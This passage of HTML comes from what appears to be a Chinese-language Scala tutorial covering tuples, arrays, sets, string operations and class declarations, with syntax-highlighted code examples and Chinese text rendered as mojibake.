class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-è®¿é—®å…ƒç´ "><a href="#3-è®¿é—®å…ƒç´ " class="headerlink" title="3. è®¿é—®å…ƒç´ "></a>3. è®¿é—®å…ƒç´ </h3><p>ä½¿ç”¨ä¸‹åˆ’çº¿è¯­æ³•è®¿é—®å…ƒç»„ï¼Œ tuple._n å–å‡ºäº†ç¬¬ n ä¸ªå…ƒç´ ï¼ˆå‡è®¾æœ‰è¶³å¤Ÿå¤šå…ƒç´ ï¼‰ã€‚</p><pre class="line-numbers language-scala"><code class="language-scala">println<span class="token punctuation">(</span>ingredient<span class="token punctuation">.</span>_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Sugar</span>println<span class="token punctuation">(</span>ingredient<span class="token punctuation">.</span>_2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-è§£æ„å…ƒç»„æ•°æ®"><a href="#4-è§£æ„å…ƒç»„æ•°æ®" class="headerlink" title="4. è§£æ„å…ƒç»„æ•°æ®"></a>4. è§£æ„å…ƒç»„æ•°æ®</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> ingredient <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"Sugar"</span> <span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">:</span>Tuple2<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">]</span><span class="token keyword">val</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> quantity<span class="token punctuation">)</span> <span class="token operator">=</span> ingredientprintln<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Sugar</span>println<span class="token punctuation">(</span>quantity<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-å…ƒç»„çš„åº”ç”¨"><a href="#5-å…ƒç»„çš„åº”ç”¨" class="headerlink" title="5. å…ƒç»„çš„åº”ç”¨"></a>5. å…ƒç»„çš„åº”ç”¨</h3><p>åœ¨ for è¡¨è¾¾å¼ä¸­</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> numPairs <span class="token operator">=</span> List<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token keyword">&lt;-</span> numPairs<span class="token punctuation">)</span> <span class="token punctuation">{</span>  println<span class="token punctuation">(</span>a <span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x06-æ•°ç»„"><a href="#0x06-æ•°ç»„" class="headerlink" title="0x06 æ•°ç»„"></a>0x06 æ•°ç»„</h2><h3 id="1-å£°æ˜-1"><a href="#1-å£°æ˜-1" class="headerlink" title="1. å£°æ˜"></a>1. å£°æ˜</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">var</span> z<span class="token operator">:</span>Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// æˆ–</span><span class="token keyword">var</span> z <span class="token operator">=</span> <span class="token keyword">new</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// æˆ–</span><span class="token keyword">var</span> z <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Baidu"</span><span class="token punctuation">,</span> <span class="token string">"Google"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-èµ‹å€¼"><a href="#2-èµ‹å€¼" class="headerlink" title="2. èµ‹å€¼"></a>2. èµ‹å€¼</h3><pre class="line-numbers language-scala"><code class="language-scala">z<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"Runoob"</span><span class="token punctuation">;</span> z<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"Baidu"</span><span class="token punctuation">;</span> z<span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"Google"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-éå†æ•°ç»„"><a href="#3-éå†æ•°ç»„" class="headerlink" title="3. éå†æ•°ç»„"></a>3. éå†æ•°ç»„</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">var</span> myList <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token number">1.9</span><span class="token punctuation">,</span> <span class="token number">2.9</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token punctuation">,</span> <span class="token number">3.5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// è¾“å‡ºæ‰€æœ‰æ•°ç»„å…ƒç´ </span><span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token keyword">&lt;-</span> myList<span class="token punctuation">)</span> <span class="token punctuation">{</span>  println<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-å¤šç»´æ•°ç»„"><a href="#4-å¤šç»´æ•°ç»„" class="headerlink" title="4. å¤šç»´æ•°ç»„"></a>4. å¤šç»´æ•°ç»„</h3><p><em>å®šä¹‰å¤šç»´æ•°ç»„</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> myMatrix <span class="token operator">=</span> Array<span class="token punctuation">.</span>ofDim<span class="token punctuation">[</span><span class="token builtin">Int</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em>äºŒç»´æ•°ç»„å¤„ç† Demo</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> Array<span class="token punctuation">.</span>_<span class="token keyword">object</span> Test <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> myMatrix <span class="token operator">=</span> Array<span class="token punctuation">.</span>ofDim<span class="token punctuation">[</span><span class="token builtin">Int</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// åˆ›å»ºçŸ©é˜µ</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            myMatrix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// æ‰“å°äºŒç»´é˜µåˆ—</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token keyword">&lt;-</span> <span class="token number">0</span> to <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            print<span class="token punctuation">(</span><span class="token string">" "</span> <span class="token operator">+</span> myMatrix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         println<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-åˆå¹¶æ•°ç»„"><a href="#5-åˆå¹¶æ•°ç»„" class="headerlink" title="5. åˆå¹¶æ•°ç»„"></a>5. åˆå¹¶æ•°ç»„</h3><p>å¯ä»¥ä½¿ç”¨ concat() æ–¹æ³•æ¥åˆå¹¶ä¸¤ä¸ªæ•°ç»„ï¼Œ concat() æ–¹æ³•ä¸­æ¥å—å¤šä¸ªæ•°ç»„å‚æ•°ï¼š</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> Array<span class="token punctuation">.</span>_<span class="token keyword">object</span> Test <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> myList1 <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token number">1.9</span><span class="token punctuation">,</span> <span class="token number">2.9</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token punctuation">,</span> <span class="token number">3.5</span><span class="token punctuation">)</span>      <span class="token keyword">var</span> myList2 <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token number">8.9</span><span class="token punctuation">,</span> <span class="token number">7.9</span><span class="token punctuation">,</span> <span class="token number">0.4</span><span class="token punctuation">,</span> <span class="token number">1.5</span><span class="token punctuation">)</span>      <span class="token keyword">var</span> myList3 <span class="token operator">=</span>  concat<span class="token punctuation">(</span> myList1<span class="token punctuation">,</span> myList2<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// è¾“å‡ºæ‰€æœ‰æ•°ç»„å…ƒç´ </span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> x <span class="token keyword">&lt;-</span> myList3 <span class="token punctuation">)</span> <span class="token punctuation">{</span>         println<span class="token punctuation">(</span> x <span class="token punctuation">)</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-åˆ›å»ºåŒºé—´æ•°ç»„"><a href="#6-åˆ›å»ºåŒºé—´æ•°ç»„" class="headerlink" title="6. åˆ›å»ºåŒºé—´æ•°ç»„"></a>6. åˆ›å»ºåŒºé—´æ•°ç»„</h3><p>ä½¿ç”¨ range() æ–¹æ³•å¯ä»¥ç”Ÿæˆä¸€ä¸ªåŒºé—´èŒƒå›´å†…çš„æ•°ç»„ï¼Œ range() æ–¹æ³•æœ€åä¸€ä¸ªå‚æ•°ä¸ºæ­¥é•¿ï¼Œé»˜è®¤ä¸º 1ï¼š</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">// ç”Ÿæˆ10-20ï¼Œæ­¥é•¿ä¸º2çš„æ•°ç»„</span><span class="token keyword">var</span> myList1 <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 10 12 14 16 18</span><span class="token comment" spellcheck="true">// ç”Ÿæˆ10-20ï¼Œæ­¥é•¿ä¸º1çš„æ•°ç»„</span><span class="token keyword">var</span> myList2 <span class="token operator">=</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 10 11 12 13 14 15 16 17 18 19</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x07-é›†åˆ"><a href="#0x07-é›†åˆ" class="headerlink" title="0x07 é›†åˆ"></a>0x07 é›†åˆ</h2><h3 id="1-é›†åˆçš„ç±»å‹"><a href="#1-é›†åˆçš„ç±»å‹" class="headerlink" title="1. é›†åˆçš„ç±»å‹"></a>1. é›†åˆçš„ç±»å‹</h3><p>Scala é›†åˆç±»åŒ…æ‹¬å¯å˜çš„å’Œä¸å¯å˜çš„é›†åˆä¸¤å¤§ç±»ã€‚å¯å˜é›†åˆç±»å¯ä»¥ä¿®æ”¹ï¼Œæ·»åŠ ï¼Œç§»é™¤ä¸€ä¸ªé›†åˆçš„å…ƒç´ ã€‚è€Œä¸å¯å˜é›†åˆç±»æ°¸è¿œä¸ä¼šæ”¹å˜ã€‚ä¸è¿‡ï¼Œä»ç„¶å¯ä»¥æ¨¡æ‹Ÿæ·»åŠ ï¼Œç§»é™¤æˆ–æ›´æ–°æ“ä½œã€‚<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1615295369841-53581cea-1e83-4642-84e5-40fe8be7a9f9.png#align=left&amp;display=inline&amp;height=443&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=443&amp;originWidth=481&amp;size=26488&amp;status=done&amp;style=none&amp;width=481" alt="image.png"></p><h3 id="2-é›†åˆçš„ä½¿ç”¨"><a href="#2-é›†åˆçš„ä½¿ç”¨" class="headerlink" title="2. é›†åˆçš„ä½¿ç”¨"></a>2. é›†åˆçš„ä½¿ç”¨</h3><p><em>ä½¿ç”¨å¯å˜é›†åˆ</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">import</span> scala<span class="token punctuation">.</span>collection<span class="token punctuation">.</span>mutable<span class="token comment" spellcheck="true">// å®šä¹‰å¯å˜é›†åˆ</span><span class="token keyword">val</span> set <span class="token operator">=</span> mutable<span class="token punctuation">.</span>Set<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><em>ä½¿ç”¨é›†åˆç±»å‹ç¼ºçœçš„æ„é€ å‡½æ•°</em></p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> seq <span class="token operator">=</span> Seq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">val</span> set <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">val</span> map <span class="token operator">=</span> Map<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token string">"one"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token string">"two"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token string">"three"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>é›†åˆåŸºæœ¬æ“ä½œ</em></p><table><thead><tr><th align="center"><strong>æ–¹æ³•</strong></th><th align="center"><strong>æè¿°</strong></th></tr></thead><tbody><tr><td align="center">head</td><td align="center">æ­¤æ–¹æ³•è¿”å›åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ </td></tr><tr><td align="center">tail</td><td align="center">æ­¤æ–¹æ³•è¿”å›ç”±é™¤ç¬¬ä¸€ä¸ªä¹‹å¤–çš„æ‰€æœ‰å…ƒç´ ç»„æˆçš„åˆ—è¡¨</td></tr><tr><td align="center">isEmpty</td><td align="center">å¦‚æœåˆ—è¡¨ä¸ºç©ºï¼Œåˆ™æ­¤æ–¹æ³•è¿”å›*&nbsp;true&nbsp;<em>ï¼Œå¦åˆ™è¿”å›</em> false&nbsp;*</td></tr></tbody></table><p><em>æ‹¼æ¥é›†åˆ</em><br>å¯ä»¥ä½¿ç”¨ ++ è¿ç®—ç¬¦æˆ– Set.++() æ–¹æ³•è¿æ¥ä¸¤ä¸ªæˆ–å¤šä¸ªé›†åˆï¼Œä½†æ˜¯åœ¨æ·»åŠ é›†åˆæ—¶ï¼Œå®ƒå°†åˆ é™¤é‡å¤çš„å…ƒç´ ã€‚</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> fruit1 <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token string">"apples"</span><span class="token punctuation">,</span> <span class="token string">"oranges"</span><span class="token punctuation">,</span> <span class="token string">"pears"</span><span class="token punctuation">)</span>      <span class="token keyword">val</span> fruit2 <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token string">"mangoes"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// use two or more sets with ++ as operator</span>      <span class="token keyword">var</span> fruit <span class="token operator">=</span> fruit1 <span class="token operator">++</span> fruit2      println<span class="token punctuation">(</span> <span class="token string">"fruit1 ++ fruit2 : "</span> <span class="token operator">+</span> fruit <span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// use two sets with ++ as method</span>      fruit <span class="token operator">=</span> fruit1<span class="token punctuation">.</span>+<span class="token operator">+</span><span class="token punctuation">(</span>fruit2<span class="token punctuation">)</span>      println<span class="token punctuation">(</span> <span class="token string">"fruit1.++(fruit2) : "</span> <span class="token operator">+</span> fruit <span class="token punctuation">)</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* è¿è¡Œç»“æœï¼šfruit1 ++ fruit2 : Set(banana, apples, mangoes, pears, oranges)fruit1.++(fruit2) : Set(banana, apples, mangoes, pears, oranges)*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>é›†åˆä¸­æŸ¥æ‰¾æœ€å¤§å€¼ï¼Œæœ€å°å…ƒç´ </em><br>å¯ä»¥ä½¿ç”¨ Set.min æ–¹æ³•å’Œ Set.max æ–¹æ³•æ¥åˆ†åˆ«æ‰¾å‡ºé›†åˆä¸­å…ƒç´ çš„æœ€å¤§å€¼å’Œæœ€å°å€¼</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> num <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// find min and max of the elements</span>      println<span class="token punctuation">(</span> <span class="token string">"Min element in Set(5,6,9,20,30,45) : "</span> <span class="token operator">+</span> num<span class="token punctuation">.</span>min <span class="token punctuation">)</span>      println<span class="token punctuation">(</span> <span class="token string">"Max element in Set(5,6,9,20,30,45) : "</span> <span class="token operator">+</span> num<span class="token punctuation">.</span>max <span class="token punctuation">)</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* è¿è¡Œç»“æœï¼šMin element in Set(5,6,9,20,30,45) : 5Max element in Set(5,6,9,20,30,45) : 45*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>æŸ¥æ‰¾äº¤é›†å€¼</em><br>å¯ä»¥ä½¿ç”¨ Set.&amp; æˆ– Set.intersect æ–¹æ³•æ¥æŸ¥æ‰¾ä¸¤ä¸ªé›†åˆä¹‹é—´çš„äº¤é›†(ç›¸äº¤å€¼)</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> num1 <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span>      <span class="token keyword">val</span> num2 <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// find common elements between two sets</span>      println<span class="token punctuation">(</span> <span class="token string">"num1.&amp;(num2) : "</span> <span class="token operator">+</span> num1<span class="token punctuation">.</span>&amp;<span class="token punctuation">(</span>num2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      println<span class="token punctuation">(</span> <span class="token string">"num1.intersect(num2) : "</span> <span class="token operator">+</span> num1<span class="token punctuation">.</span>intersect<span class="token punctuation">(</span>num2<span class="token punctuation">)</span> <span class="token punctuation">)</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* è¿è¡Œç»“æœnum1.&amp;(num2) : Set(20, 9)num1.intersect(num2) : Set(20, 9)*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x08-å­—ç¬¦ä¸²æ“ä½œ"><a href="#0x08-å­—ç¬¦ä¸²æ“ä½œ" class="headerlink" title="0x08 å­—ç¬¦ä¸²æ“ä½œ"></a>0x08 å­—ç¬¦ä¸²æ“ä½œ</h2><h3 id="1-å¸¸ç”¨æ“ä½œ"><a href="#1-å¸¸ç”¨æ“ä½œ" class="headerlink" title="1. å¸¸ç”¨æ“ä½œ"></a>1. å¸¸ç”¨æ“ä½œ</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">//å­—ç¬¦ä¸²å»é‡</span><span class="token string">"aabbcc"</span><span class="token punctuation">.</span>distinct <span class="token comment" spellcheck="true">// "abc"</span><span class="token comment" spellcheck="true">//å–å‰nä¸ªå­—ç¬¦ï¼Œå¦‚æœnå¤§äºå­—ç¬¦ä¸²é•¿åº¦è¿”å›åŸå­—ç¬¦ä¸²</span><span class="token string">"abcd"</span><span class="token punctuation">.</span>take<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "abcd"</span><span class="token comment" spellcheck="true">//å­—ç¬¦ä¸²æ’åº</span><span class="token string">"bcad"</span><span class="token punctuation">.</span>sorted <span class="token comment" spellcheck="true">// "abcd"</span><span class="token comment" spellcheck="true">//è¿‡æ»¤ç‰¹å®šå­—ç¬¦</span><span class="token string">"bcad"</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>_ <span class="token operator">!=</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "bcd"</span><span class="token comment" spellcheck="true">//ç±»å‹è½¬æ¢</span><span class="token string">"true"</span><span class="token punctuation">.</span>toBoolean<span class="token string">"123"</span><span class="token punctuation">.</span>toInt<span class="token string">"123.0"</span><span class="token punctuation">.</span>toDouble<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-åŸç”Ÿå­—ç¬¦ä¸²"><a href="#2-åŸç”Ÿå­—ç¬¦ä¸²" class="headerlink" title="2. åŸç”Ÿå­—ç¬¦ä¸²"></a>2. <strong>åŸç”Ÿå­—ç¬¦ä¸²</strong></h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">//åŒ…å«æ¢è¡Œçš„å­—ç¬¦ä¸²</span><span class="token keyword">val</span> s1<span class="token operator">=</span> <span class="token string">"""Welcome here.   Type "HELP" for help!"""</span><span class="token comment" spellcheck="true">//åŒ…å«æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²</span><span class="token keyword">val</span> regex <span class="token operator">=</span> <span class="token string">"""\d+"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-å­—ç¬¦ä¸²æ’å€¼"><a href="#3-å­—ç¬¦ä¸²æ’å€¼" class="headerlink" title="3. å­—ç¬¦ä¸²æ’å€¼"></a>3. å­—ç¬¦ä¸²æ’å€¼</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> name <span class="token operator">=</span> <span class="token string">"world"</span><span class="token keyword">val</span> msg <span class="token operator">=</span> s<span class="token string">"hello, ${name}"</span> <span class="token comment" spellcheck="true">// hello, world</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x09-ç±»å’Œå¯¹è±¡"><a href="#0x09-ç±»å’Œå¯¹è±¡" class="headerlink" title="0x09 ç±»å’Œå¯¹è±¡"></a>0x09 ç±»å’Œå¯¹è±¡</h2><h3 id="1-å£°æ˜ç±»"><a href="#1-å£°æ˜ç±»" class="headerlink" title="1. å£°æ˜ç±»"></a>1. å£°æ˜ç±»</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">class</span> Point<span class="token punctuation">(</span>xc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> yc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">var</span> x<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> xc   <span class="token keyword">var</span> y<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> yc   <span class="token keyword">def</span> move<span class="token punctuation">(</span>dx<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> dy<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      x <span class="token operator">=</span> x <span class="token operator">+</span> dx      y <span class="token operator">=</span> y <span class="token operator">+</span> dy      println <span class="token punctuation">(</span><span class="token string">"x çš„åæ ‡ç‚¹: "</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>      println <span class="token punctuation">(</span><span class="token string">"y çš„åæ ‡ç‚¹: "</span> <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-å®ä¾‹åŒ–ç±»"><a href="#2-å®ä¾‹åŒ–ç±»" class="headerlink" title="2. å®ä¾‹åŒ–ç±»"></a>2. å®ä¾‹åŒ–ç±»</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">object</span> Test <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> pt <span class="token operator">=</span> <span class="token keyword">new</span> Point<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token 